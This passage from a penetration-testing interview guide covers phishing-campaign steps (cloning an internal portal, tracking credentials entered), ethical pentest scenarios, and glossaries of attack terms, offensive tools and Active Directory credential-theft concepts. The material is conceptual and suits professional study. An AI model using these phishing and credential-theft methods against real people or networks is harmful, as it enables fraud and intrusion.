  → Research via LinkedIn: org chart, job titles, ongoing projects
  → Match pretext to target: IT? → "password reset" | Finance? → "invoice"
  → Clone legitimate internal portal (exact pixel match)
  → Test email deliverability before sending (Mail-tester.com)

Execution:
  → Send in business hours (Tue-Thu, 9-11am highest click rate)
  → Track: opens, clicks, credentials entered, downloads
  → Monitor for IR response → adjust if caught quickly

Reporting:
  → Click rate, credential submission rate, time to detection
  → Which departments/levels were most susceptible
  → Recommend: security awareness training, email filtering, MFA hardening
```

---

## 🔵 SECTION 4 — BEHAVIORAL QUESTIONS

---

### Q29. How do you handle a situation where you've made a mistake during a pentest that caused service disruption?

**Answer framework:**

> "Transparency is non-negotiable. If I accidentally cause a service disruption — even if I think it'll recover — I immediately notify the client's emergency contact via phone. I don't wait to see if it comes back up on its own.

> I document exactly what I ran, when, and what the apparent impact was. This helps their ops team recover faster than if they're investigating blind. Then I pause testing on that component until they confirm it's safe to continue.

> I've had a situation in a lab environment where an aggressive Nmap scan caused a legacy printer server to hang. I notified immediately, the ops team power-cycled it, and we added it to the exclusion list. Mistakes happen — what matters is how you handle them."

**Key message:** Honesty, immediate notification, documentation, take responsibility.

---

### Q30. How do you handle a client who disagrees with your severity ratings?

> "I listen to their perspective first — sometimes they have context I don't. If they say 'that SQL injection is only in an internal tool not exposed externally,' that's valid context that might change the risk rating.

> But if they're pushing back purely to reduce their risk exposure on paper, I hold my ground professionally. I explain the CVSS scoring methodology, walk through the specific metrics, and show the business impact. I can add a 'Client Note' in the report documenting their position while maintaining my technical assessment.

> The report has my name on it — I won't inflate or deflate findings based on politics. My credibility as a pentester depends on objective findings."

---

### Q31. A red team operation requires you to test an employee with a realistic phishing email targeting personal emotions (family emergency fake email). The client requests this. Do you proceed?

> "I'd have a direct conversation with the client about this. While highly realistic pretexts are legitimate red team tactics, there's a line between testing security awareness and potentially causing genuine emotional harm or psychological distress.

> I'd propose alternatives: a crisis-adjacent pretext ('IT emergency — your credentials are at risk') that tests the same behavioral response without involving fake family emergencies.

> If the client still insists, I'd want this explicitly documented in the RoE with sign-off from their HR and legal teams — because this now has employee relations implications beyond just security. I'd also ensure immediate debrief for any affected employees.

> My role is security testing, not social harm. But I recognize there's a spectrum and I'd work with the client to find the most effective approach within ethical bounds."

---

### Q32. How do you stay current in offensive security?

**Structured approach:**

```
Daily (15-30 min):
  → X/Twitter: @hFireF0X, @gentilkiwi, @harmj0y, @_dirkjan, @vysecurity
  → RSS: NVD new CVEs, offensive security blogs

Weekly:
  → 1 CTF machine on Hack The Box or VulnHub
  → Read 1 vulnerability disclosure/writeup in full depth

Monthly:
  → 1 conference talk: DEF CON, Black Hat, BSides (free on YouTube)
  → Review new ATT&CK technique additions
  → Test 1 new tool or technique in home lab

Resources:
  → PortSwigger Web Security Academy (free, best web app resource)
  → SANS reading room for research papers
  → Hack Tricks (hacktricks.xyz) for technique reference
  → PayloadsAllTheThings GitHub
  → The Hacker Playbook series (books)
```

---

### Q33. What do you do when you complete an engagement and couldn't find any significant vulnerabilities?

> "First, I don't assume I missed things — I document what I tested, how I tested it, and what controls appeared to be in place. A clean result with documented methodology is valuable.

> In the report, I document positive findings: 'SMB signing enforced across all hosts,' 'Patch management current — no CVEs found on exposed services,' 'Strong password policy confirmed.' This gives the client confidence based on evidence, not just the absence of findings.

> I also recommend what to test next — scope is always limited. If I only tested external, I might recommend internal or application-layer testing.

> Finally, I consider whether I had the right tools and enough time. If there's reason to believe something was missed, I'm transparent about that. A good tester knows the limits of their assessment."

---

## ⚡ SECTION 5 — QUICK FIRE ROUND

### Terminology
| Question | Answer |
|----------|--------|
| What is RCE? | Remote Code Execution — run arbitrary commands on target |
| What is LFI? | Local File Inclusion — read local files via path traversal in web app |
| What is RFI? | Remote File Inclusion — include remote malicious file for execution |
| What is SSRF? | Server-Side Request Forgery — make server issue requests on attacker's behalf |
| What is IDOR? | Insecure Direct Object Reference — access objects by changing IDs |
| What is CSRF? | Cross-Site Request Forgery — force authenticated user to make unintended request |
| What is XXE? | XML External Entity — exploit XML parsers to read files / SSRF |
| What is SSTI? | Server-Side Template Injection — inject template syntax for code execution |
| What is XSS? | Cross-Site Scripting — inject JavaScript into web pages |
| What is SQLi? | SQL Injection — manipulate SQL queries through unsanitized input |
| What is C2? | Command & Control — infrastructure attacker uses to manage compromised hosts |
| What is IOC? | Indicator of Compromise — evidence of intrusion (hash, IP, domain) |
| What is TTP? | Tactics, Techniques, and Procedures — adversary behavior patterns |
| What is LOLBin? | Living-off-the-Land Binary — built-in OS tool abused for attacks |
| What is AV? | Antivirus — signature + behavior-based malware detection |
| What is EDR? | Endpoint Detection & Response — advanced endpoint monitoring and response |
| What is OPSEC? | Operational Security — protecting attacker's methods/identity from detection |
| What is OSINT? | Open Source Intelligence — gathering info from public sources |
| What is lateral movement? | Moving from compromised host to other hosts in same network |
| What is persistence? | Maintaining access across reboots/logoffs |

### Tools
| Tool | Primary Use |
|------|------------|
| Nmap | Port scanning, service detection |
| BloodHound | AD attack path mapping |
| Mimikatz | Credential dumping from Windows memory |
| Impacket | Python tools for Windows protocols (SMB, Kerberos, MSRPC) |
| Metasploit | Exploit framework with payloads |
| Burp Suite | Web application testing proxy |
| Cobalt Strike | Commercial C2 framework |
| Havoc / Sliver | Open-source C2 frameworks |
| Responder | LLMNR/NBT-NS/MDNS poisoning |
| CrackMapExec | Swiss army knife for Windows network |
| Amass / Subfinder | Subdomain enumeration |
| Feroxbuster | Web directory brute force |
| sqlmap | Automated SQL injection |
| Hashcat | GPU-accelerated password cracking |
| John the Ripper | CPU-based password cracking |
| Evilginx2 | MFA bypass via reverse proxy phishing |
| PowerSploit/PowerView | PowerShell-based AD enumeration |
| SharpHound | BloodHound data collector |
| Volatility | Memory forensics (used post-compromise to see what blue team finds) |

### Quick AD Concepts
| Concept | One-line answer |
|---------|----------------|
| What is a SPN? | Service Principal Name — identifies service instance for Kerberos auth |
| What is KRBTGT? | Special AD account — its hash is used to sign all Kerberos tickets |
| What is DCSync? | Mimicking DC replication to extract password hashes |
| What is constrained delegation? | Allow service to impersonate users only to specific other services |
| What is unconstrained delegation? | Service can impersonate users to ANY service — high risk |
| What is ACL abuse? | Exploiting AD permission misconfigs (GenericAll, WriteDACL, etc.) |
| What is LSASS? | Windows process storing credentials — prime dump target |
| What is SAM database? | Windows local password hash storage |
| What is NTDS.dit? | Active Directory database — contains all domain password hashes |
| What is SID? | Security Identifier — unique ID for every AD object |

---

## 📊 INTERVIEW PREPARATION MATRIX

### By Experience Level

| Level | Focus Areas | Expected Depth |
|-------|------------|---------------|
| Junior (0-2 yrs) | Q1-Q9, Q21, Tools quick fire | Conceptual + basics of exploitation |
| Mid (2-4 yrs) | Q10-Q16, Q23-Q25, All quick fire | Hands-on, specific engagement experience |
| Senior (4-7 yrs) | Q17, Q23-Q28, All behavioral | Full methodology, report quality, client handling |
| Red Team Lead | All + leadership, program building | Strategic thinking, team management, business alignment |

### Top 10 Must-Master Concepts for Any Level
1. **Pentest methodology** (Q1) — asked in 95% of interviews
2. **Kerberoasting + AS-REP roasting** (Q3, Q4) — AD fundamentals
3. **BloodHound usage** (Q10) — modern AD pentest essential
4. **OWASP Top 10** (Q7) — web app testing foundation
5. **Privilege escalation Windows + Linux** (Q8, Q9) — core skill
6. **Pass-the-Hash / Pass-the-Ticket** (Q5) — Windows lateral movement
7. **MITRE ATT&CK usage** (Q15) — framework fluency
8. **Responsible disclosure / RoE** (Q16, Q24, Q27) — professionalism signals
9. **Report writing** (Q17) — differentiates good vs great testers
10. **C2 concepts + evasion** (Q26) — senior/red team signal

---

*Last Updated: 2024 | Corporate Edition | Red Team Series | Part 3 of 4*

